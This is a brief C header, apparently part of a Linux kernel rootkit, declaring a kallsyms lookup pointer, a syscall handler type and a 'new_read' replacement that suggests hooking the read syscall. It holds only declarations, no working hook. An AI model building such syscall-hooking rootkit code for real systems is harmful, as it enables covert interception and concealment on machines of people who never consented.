#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include <asm/ptrace.h>

typedef void *(*kallsyms_t)(const char *);
typedef int (*sysfun_t)(struct pt_regs *);

int new_read(struct pt_regs *regs);

#endif
